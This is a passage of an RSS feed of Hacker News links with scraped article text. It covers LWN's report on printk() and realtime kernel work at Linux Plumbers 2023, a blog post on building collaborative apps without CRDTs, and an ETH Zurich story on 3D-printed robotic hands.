waiting in linux-next; this work has been <a href="https://lwn.net/Articles/780556/">covered here</a> at times.  There are, he said,
three final patch sets currently in the works to finish the job.  A few
tricky details are still being worked on.  One of those is the handover
mechanism; if the kernel has an emergency message to put out (it's
crashing, for example), it may need to grab control of a console that is
currently printing a lower-priority message.  Doing that safely from any
context is not an easy thing to do.
</p><p>
Another ongoing task is marking console drivers that are not safe to use in
some contexts; if, for example, outputting a message during a non-maskable
interrupt requires doing video-mode setting, it's just not going to work.
</p><p>
Gleixner finished the prepared part of his talk by saying that, even
though it's getting close, nobody should ask him when the work will be
done.  <tt>printk()</tt> is unpredictable, and he is no longer willing to
even try.  Even so, he expressed hopes that the rest of the realtime
preemption code would be in mainline before the 20th anniversary comes late
in 2024.
</p><p>


<a href="https://lwn.net/Articles/951341/"><img src="https://static.lwn.net/images/conf/2023/lpc/JohnOgness-sm.png" alt="[John Ogness]" title="John Ogness"></a>


An audience member asked whether there had been any interesting changes in
the <tt>printk()</tt> code over the last year; Gleixner answered that there
have been no fundamental conceptual changes.  John Ogness, who has done
much of the <tt>printk()</tt> work, said that the handover code has been
reduced somewhat, but that some work remains; there are 76 console drivers
in the kernel that need to be fixed, and it may take a while until they are
all done.  The handover code has been changed to allow drivers to be
updated one at a time rather than requiring that this work all be done at
once.  (See <a href="https://lwn.net/Articles/909980/">this article</a> for more
discussion on the recent <tt>printk()</tt> work).
</p><p>
Masami Hiramatsu asked which kernel messages need to be printed
synchronously; Gleixner answered that almost everything should be made
asynchronous.  Beyond reducing latency associated with <tt>printk()</tt>
calls, asynchronous output allows the creation of a separate kernel thread for
each console, letting the faster consoles go at full speed rather than
waiting for the slowest one.  He also said that the code has been changed
to ensure that important messages are fully copied into the message buffer
before the first line is output, just in case a faulty console driver brings
the whole system down in flames.  Further safety is obtained by writing to
the known-safe consoles first.  If, for example, there is a
persistent-memory store available, messages are put there before being sent
to physical devices, once again preserving the output even if a faulty
driver kills the system.
</p><p>
As the session closed, Clark Williams asked whether, once the
<tt>printk()</tt> patches go upstream, Gleixner would try to push the rest
of the realtime code (which wasn't discussed in this session) in the same
merge window.  The answer was a qualified "yes"; he might try if all of the
code is staged in linux-next and seems ready to go.
</p><div><p>
[Thanks to the Linux Foundation, LWN's travel sponsor, for supporting our
travel to this event.]
</p></div><table>
           <tbody><tr><th colspan="2">Index entries for this article</th></tr>
           <tr><td><a href="https://lwn.net/Kernel/Index">Kernel</a></td><td><a href="https://lwn.net/Kernel/Index#Kernel_messages">Kernel messages</a></td></tr>
            <tr><td><a href="https://lwn.net/Kernel/Index">Kernel</a></td><td><a href="https://lwn.net/Kernel/Index#Realtime">Realtime</a></td></tr>
            <tr><td><a href="https://lwn.net/Archives/ConferenceIndex/">Conference</a></td><td><a href="https://lwn.net/Archives/ConferenceIndex/#Linux_Plumbers_Conference-2023">Linux Plumbers Conference/2023</a></td></tr>
            </tbody></table><br clear="all">

               <br clear="all">
               <hr><p>
           (<a href="https://lwn.net/Login/?target=/Articles/951337/">Log in</a> to post comments)
           </p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[OpenSubtitles is not open anymore (165 pts)]]></title>
            <link>https://blog.opensubtitles.com/opensubtitles/saying-goodbye-to-opensubtitles-org-api-embrace-the-20-black-friday-treat</link>
            <guid>38289582</guid>
            <pubDate>Thu, 16 Nov 2023 14:01:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.opensubtitles.com/opensubtitles/saying-goodbye-to-opensubtitles-org-api-embrace-the-20-black-friday-treat">https://blog.opensubtitles.com/opensubtitles/saying-goodbye-to-opensubtitles-org-api-embrace-the-20-black-friday-treat</a>, See on <a href="https://news.ycombinator.com/item?id=38289582">Hacker News</a></p>
Couldn't get https://blog.opensubtitles.com/opensubtitles/saying-goodbye-to-opensubtitles-org-api-embrace-the-20-black-friday-treat: Error: timeout of 10000ms exceeded]]></description>
        </item>
        <item>
            <title><![CDATA[You don't need a CRDT to build a collaborative experience (161 pts)]]></title>
            <link>https://zknill.io/posts/collaboration-no-crdts/</link>
            <guid>38289327</guid>
            <pubDate>Thu, 16 Nov 2023 13:36:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://zknill.io/posts/collaboration-no-crdts/">https://zknill.io/posts/collaboration-no-crdts/</a>, See on <a href="https://news.ycombinator.com/item?id=38289327">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content"><h2 id="you-dont-need-crdts">You don’t need CRDTs</h2><p><strong>You don’t need CRDTs for collaborative experiences.</strong></p><p>First lets get the ‘what-about-ery’ out the way…</p><div><p><i></i>Things you do need CRDTs for<i></i></p><div><ol><li>Offline first – this is wayy harder to get useful behaviour with out CRDTs. If you don’t use them, you’re pretty much destined to have LWW (which is actually a CRDT behaviour),
and one user is likely to overwrite the changes of another. This isn’t a great experience for anyone involved.</li><li>Text editing – everyone’s gonna say “but hey, google docs uses operational transform not CRDTs”.. OK yes, but <em>you are not google</em>. Martin Kleppmann has a great round-up of the
various people who though they implemented OT correctly, but actually didn’t. The reason that you need CRDTs for text editing collaboration is that it’s a really extreme example
of collaboration. The nature of text editing is that any tiny errors in the placement of characters by the convergence algorithm is going to create incorrect words, and
incorrect words are incredibly obvious. Text editing has a high rate of edits (as you type), and the edits need to interleave perfectly or you get incorrect words, and errors in
the interleaving are super obvious (incorrect words)!</li></ol></div></div><p>Hold, on.. that all sounds great, but..</p><p><strong>Maybe I want to use a CRDT even if I don’t strictly need to?</strong> OK, yes, maybe you do.</p><p>But CRDTs are not without their downsides:</p><ul><li><strong>Ever-growing state</strong>: for CRDTs to work well they need to keep a record of both what exists, and what has been deleted (so that the deletes aren’t accidentally added back in later).
This means that CRDT state will continually expand. There’s a bunch of magic that CRDT library authors are doing with clever compression techniques to make this problem less-bad,
but it’s basically in-escapable. The size of your CRDT state is not purely a function of the size of the state the CRDT represents, but also of the number of updates that state
has gone through.</li><li><strong>Complex implementations</strong>: CRDTs are easy to implement wrong, so probably don’t roll your own. Instead you’re going to end up using one of the main libraries that are growing in
maturity and popularity. These libraries solve the hard internal-CRDT problems for you, like converging updates, and compressing state, etc. But in using one of these, you’re
locked into that technology (generally Javascript).</li><li><strong>Opaque state</strong>: Because the CRDT has to represent <em>both</em> the underlying state and the updates that led to that state, in order for it’s convergence algorithm to work properly,
you’re generally left with an opaque blob of binary encoded data. You can’t inspect your model represented by the CRDT without using the CRDT library to decode the blob, and you
can’t just store the underlying model state because the CRDT needs its change history also. You’re left with an opaque blob of data in your database. You can’t join on it, you
can’t search it, you can’t do much without building extra features around that state blob.</li></ul><p>So maybe you are convinced that CRDTs are not the be-all-and-end-all of collaboration, and that you aren’t in one of the two categories where you probably should use a CRDT, and
you’ve made it this far in the post.</p><h2 id="what-you-need-instead-of-crdts">What you need instead of CRDTs</h2><p><strong>Now, let me explain why you don’t need CRDTs, and what you do need instead:</strong></p><div><p><i></i>What you do need<i></i></p><div><ol><li><strong>Contextual information</strong> – the ability to show where a collaborator is in the collaborative environment; who is engaging with the page, which element they’ve selected, and where
their cursor is.</li><li><strong>Locking for safety</strong> – the ability to lock them smallest possible individual components or elements of the page to stop conflicting updates from happening.</li><li><strong>Small-scale updates</strong> – the ability to update only the information that has changed, and no more.</li><li><strong>Realtime fan-out of updates</strong> – the ability to share the update a user has made, in real-time, with all the other collaborators in that environment.</li></ol></div></div><p><img src="https://zknill.io/img/collaboration-features.png" data-src="/img/collaboration-features.png" data-srcset="/img/collaboration-features.png, /img/collaboration-features.png 1.5x, /img/collaboration-features.png 2x" data-sizes="auto" alt="/img/collaboration-features.png" title="Collaboration features" srcset="https://zknill.io/img/collaboration-features.png, https://zknill.io/img/collaboration-features.png 1.5x, https://zknill.io/img/collaboration-features.png 2x"></p><p>Remind me again why this is better? Well, you get realtime collaborative experiences in a data format/structure that you own and control, without suffering any of the downsides of
CRDTs. TL;DR - because it works!</p><h2 id="examples-of-collaboration-without-crdts">Examples of collaboration without CRDTs</h2><p>I’ll run through a bunch of broad categories of applications, and describe how to make use of these features.</p><h4 id="form-builders-google-forms-typeform-attest-etc"><strong>Form builders</strong>; Google Forms, Typeform, Attest, etc</h4><p>Typically lots of smaller individual inputs. You’re unlikely to want two users collaborating on the same form-box at once.</p><p>How to make it collaborative:</p><ol><li>Lock the individual inputs/elements that a user is engaging with.</li><li>Add Contextual information to show which user has locked which element.</li><li>Add Contextual information to allow users to indicate to each other with their cursors.</li><li>Have a mechanism to update only the form element that has changed, so that two users making updates at the same time do not overwrite each other</li><li>Have a mechanism to fan-out the update that each user has made to the other user’s in real-time, so that each can see the other’s changes as soon as the input is unlocked.</li></ol><h4 id="task-management-jira-shortcut-trello-linear"><strong>Task management</strong>; Jira, Shortcut, Trello, Linear</h4><p>Typically lots of ‘cards’ or ’tasks’ with various properties: status, owner, title, description, project, epic, etc.</p><p>How to make it collaborative:</p><ol><li>Lock the individual inputs/elements that a user is engaging with.</li><li>Add Contextual information to show which user has locked which element.</li><li>Have a mechanism to update only the form element that has changed, so that two users making updates at the same time do not overwrite each other</li><li>Have a mechanism to fan-out the update that each user has made to the other user’s in real-time, so that each can see the other’s changes as soon as the input is unlocked.</li></ol><h4 id="spreadsheets-google-sheets-airtable"><strong>Spreadsheets</strong>; Google sheets, Airtable</h4><p>Typically a ui of rows and columns. Sometimes the records can expand to show inner-details of that row, similar to the task management apps.</p><p>How to make it collaborative:</p><ol><li>Lock the individual inputs/elements that a user is engaging with. For Google Sheets; the individual cells. For Airtable, the individual elements on the record.</li><li>Add Contextual information to show which user has locked which element.</li><li>Have a mechanism to update only the form element that has changed, so that two users making updates at the same time do not overwrite each other</li><li>Have a mechanism to fan-out the update that each user has made to the other user’s in real-time, so that each can see the other’s changes as soon as the input is unlocked.</li></ol><h4 id="picture-drawing-presentation-and-whiteboards-miro-figma-google-slides"><strong>Picture drawing, presentation and whiteboards</strong>; Miro, Figma, Google Slides</h4><p>Typically free-form drawing combined with preset shapes, stickies, note and text boxes, and more.</p><p>How to make it collaborative:</p><ol><li>Lock the individual elements that a user is engaging with, it doesn’t really matter if two users draw over the same part of the canvas. It only matters if two users try and
change the same element at once.</li><li>Add Contextual information to show which user has locked which element.</li><li>Add Contextual information to allow users to indicate to each other with their cursors.</li><li>Have a mechanism to update only the form element that has changed, so that two users making updates at the same time do not overwrite each other</li><li>Have a mechanism to fan-out the update that each user has made to the other user’s in real-time, so that each can see the other’s changes as soon as the input is unlocked.</li></ol><h2 id="design-patterns">Design patterns</h2><p>You can start to see a few things here;</p><ul><li>The pattern for building collaborative experiences is almost exactly the same across all of these types of applications that
don’t need CRDTs,</li><li>Many of the applications that you know from these broad categories operate in exactly this way. A few examples; cell locking in Google Sheets,
post-it locking in Miro and Figma, element locking in Google Slides.</li></ul></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Printed robots with bones, ligaments, and tendons (186 pts)]]></title>
            <link>https://ethz.ch/en/news-and-events/eth-news/news/2023/11/printed-robots-with-bones-ligaments-and-tendons.html</link>
            <guid>38288980</guid>
            <pubDate>Thu, 16 Nov 2023 12:56:45 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://ethz.ch/en/news-and-events/eth-news/news/2023/11/printed-robots-with-bones-ligaments-and-tendons.html">https://ethz.ch/en/news-and-events/eth-news/news/2023/11/printed-robots-with-bones-ligaments-and-tendons.html</a>, See on <a href="https://news.ycombinator.com/item?id=38288980">Hacker News</a></p>
<div id="readability-page-1" class="page"><section id="content">
                
                    
    
    <!-- Panorama header -->
    

    <!-- Blog header -->
    
    <!-- Tags when not blog -->
    
        
    
    
    

    <!-- Articleheader -->
    <div>
    <p>
            For the first time, researchers have succeeded in printing a robotic hand with bones, ligaments and tendons made of different polymers using a new laser scanning technique.
        </p>
    

</div>

    <!-- Nav & News images -->
    

    <!-- Details -->
    <div>
        <p><span>
            <time datetime="2023-11-15T00:00:00Z">15.11.2023</time>
            
                by
                
                    <a href="https://ethz.ch/en/news-and-events/eth-news/news.html?AUTHOR=RmFiaW8gQmVyZ2FtaW4&amp;path=L2NvbnRlbnQvbWFpbi9lbi9uZXdzLXVuZC12ZXJhbnN0YWx0dW5nZW4vZXRoLW5ld3MvbmV3cy9qY3I6Y29udGVudA" title="Fabio Bergamin">
                
                Fabio Bergamin
                
                    </a>
                
            
            
            
        </span></p><ul>
            <li>
                <a id="newsCommentsLink" href="#comment-system">
                    
                    <span>Number of comments</span>
                </a>
            </li>
            <!-- Socialsharing (configurable) -->
            
    
        
            
                <li>
            
            
            
                </li>
            
        
        
    

        </ul>
    </div>

    <!-- ArticleLeadImage -->
    
        <div>
            <figure>
            <img alt="Two hands printed by a 3D-printer. The left one holds an Eding-Pen and the right one holds a bottle of water" src="https://ethz.ch/en/news-and-events/eth-news/news/2023/11/printed-robots-with-bones-ligaments-and-tendons/_jcr_content/articleLeadImage/image.imageformat.carousel.1442261976.jpg">
			<figcaption>
			    <p>
			      3D printed in one go: A robotic hand made of varyingly rigid and elastic polymers. (Photograph: ETH Zurich/Thomas Buchner)</p>
			  </figcaption>
			</figure>
    
          </div>
    

    <!-- Parsys 1 --> 
    <div>

<div>
                
                	<h2>In brief</h2>
                
                
                <ul> 
 <li><span>By making 3D printing suitable for slow-curing polymers, researchers have greatly expanded the possibilities of soft robotics. The new materials have advantages over the previous ones.</span></li> 
 <li><span>The advances were possible thanks to a new technology that combines 3D printing with a laser scanner and a feedback mechanism.</span></li> 
 <li><span>A spin-off in the US now offers this technology and prints complex objects on customer request.</span></li> 
</ul>
            </div>
<div>
                
                
                <p>3D printing is advancing rapidly, and the range of materials that can be used has expanded considerably. While the technology was previously limited to fast-curing plastics, it has now been made suitable for slow-curing plastics as well. These have decisive advantages as they have enhanced elastic properties and are more durable and robust.</p>
<p>The use of such polymers is made possible by a new technology developed by researchers at ETH Zurich and a US start-up. As a result, researchers can now 3D print complex, more durable robots from a variety of high-quality materials in one go. This new technology also makes it easy to combine soft, elastic, and rigid materials. The researchers can also use it to create delicate structures and parts with cavities as desired.</p>
<h2><b>Materials that return to their original state</b></h2>
<p>Using the new technology, researchers at ETH Zurich have succeeded for the first time in printing a robotic hand with bones, ligaments and tendons made of different polymers in one go. “We wouldn’t have been able to make this hand with the fast-curing polyacrylates we’ve been using in 3D printing so far,” explains Thomas Buchner, a doctoral student in the group of ETH Zurich robotics professor Robert Katzschmann and first author of the study. “We’re now using slow-curing thiolene polymers. These have very good elastic properties and return to their original state much faster after bending than polyacrylates.” This makes thiolene polymers ideal for producing the elastic ligaments of the robotic hand.</p>

            </div>
<div>
            <figure>
            <div>
                <a onclick="javascript:ETHZ_Design.Video.showOverlay(event, this);" onkeypress="javascript:ETHZ_Design.Video.showOverlay(event, this);" tabindex="0" aria-label="YouTube video -  Agree to privacy policy to play video.">
                    <div>
                        <p><img src="https://ethz.ch/bin/ethz/components/previewImage/youtube/54jg4uduIt0.jpg"></p>
                        </div>
                    
                </a>
                <p>
                    By playing the video you accept the privacy policy of YouTube.<a href="https://policies.google.com/privacy?gl=CH&amp;hl=en">Learn more</a>
                    <a onclick="javascript:ETHZ_Design.Video.loadIframe(event, this, 'youtube');" onkeypress="javascript:ETHZ_Design.Video.loadIframe(event, this, 'youtube');" tabindex="0" role="button">OK</a>
                </p>
            </div>
            <figcaption>(Video: ETH Zurich / Nicole Davidson)</figcaption>
                </figure>
            </div>
<div>
                
                
                <p>In addition, the stiffness of thiolenes can be fine-tuned very well to meet the requirements of soft robots. “Robots made of soft materials, such as the hand we developed, have advantages over conventional robots made of metal. Because they’re soft, there is less risk of injury when they work with humans, and they are better suited to handling fragile goods,” Katzschmann explains.</p>
<h2><b>Scanning instead of scraping</b></h2>
<p>3D printers typically produce objects layer by layer: nozzles deposit a given material in viscous form at each point; a UV lamp then cures each layer immediately. Previous methods involved a device that scraped off surface irregularities after each curing step. This works only with fast-curing polyacrylates. Slow-curing polymers such as thiolenes and epoxies would gum up the scraper.</p>

            </div>
<div>
                        <figure>
            <img alt="Creation process of a hand being printed" src="https://ethz.ch/en/news-and-events/eth-news/news/2023/11/printed-robots-with-bones-ligaments-and-tendons/_jcr_content/wide_content/image/image.imageformat.1286.1632000253.jpg">
			<figcaption>
			    <p>
			      The robotic hand is printed layer by layer using polymers of varying elasticity (left: schematic, right: computer graphics). (Visualisations: Buchner TJK et al., Nature 2023)</p>
			  </figcaption>
			</figure>
    
                    </div>
<div>
            <p>To accommodate the use of slow-curing polymers, the researchers developed 3D printing further by adding a 3D laser scanner that immediately checks each printed layer for any surface irregularities. “A feedback mechanism compensates for these irregularities when printing the next layer by calculating any necessary adjustments to the amount of material to be printed in real time and with pinpoint accuracy,” explains Wojciech Matusik, a professor at the Massachusetts Institute of Technology (MIT) in the US and co-author of the study. This means that instead of smoothing out uneven layers, the new technology simply takes the unevenness into account when printing the next layer.</p>
        </div>
<div>
                        <figure>
            <img alt="Two examples of a 3D-printing" src="https://ethz.ch/en/news-and-events/eth-news/news/2023/11/printed-robots-with-bones-ligaments-and-tendons/_jcr_content/wide_content/image_1286535002/image.imageformat.1286.1443377098.jpg">
			<figcaption>
			    <p>
			      Other examples of 3D-printing include a legged robot and metamaterials. The latter could be used to absorb vibrations. (Photographs: ETH Zurich / Thomas Buchner)</p>
			  </figcaption>
			</figure>
    
                    </div>
<div>
                
                
                <p>Inkbit, an MIT spin-off, was responsible for developing the new printing technology. The ETH Zurich researchers developed several robotic applications and helped optimise the printing technology for use with slow-curing polymers. The researchers from Switzerland and the US have now jointly published the technology and their sample applications in the journal <i>Nature</i>.</p>
<p>At ETH Zurich, Katzschmann’s group will use the technology to explore further possibilities and to design even more sophisticated structures and develop additional applications. Inkbit is planning to use the new technology to offer a 3D printing service to its customers and to sell the new printers.<br>
</p>

            </div>
<div>
                
                	<h2><b>Reference</b></h2>
                
                
                <p>Buchner TJK, Rogler S, Weirich S, Armati Y, Cangan BG, Ramos J, Twiddy S, Marini D, Weber A, Chen D, Ellson G, Jacob J, Zengerle W, Katalichenko D, Keny C, Matusik W, Katzschmann RK: Vision-Controlled Jetting for Composite Systems and Robots, Nature, 15. November 2023, doi: <a href="https://doi.org/10.1038/s41586-023-06684-3"><span>external page</span>10.1038/s41586-023-06684-3</a></p>
            </div>

</div>
    <!-- Socialsharing (display only) -->
    
    
        
            
            
            
        
        
    


    <!-- Parsys 2 -->
    
    <!-- Taglist -->
    
        
            
        
    

    <!-- Comments -->
    
    	
	    
    

                
                
            </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[I think I need to go lie down (643 pts)]]></title>
            <link>https://twitter.com/multikev/status/1724908185361011108</link>
            <guid>38288130</guid>
            <pubDate>Thu, 16 Nov 2023 11:07:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://twitter.com/multikev/status/1724908185361011108">https://twitter.com/multikev/status/1724908185361011108</a>, See on <a href="https://news.ycombinator.com/item?id=38288130">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="ScriptLoadFailure"><form action="" method="GET"><div><p><span>Something went wrong, but don’t fret — let’s give it another shot.</span></p><br></div></form></div></div>]]></description>
        </item>
    </channel>
</rss>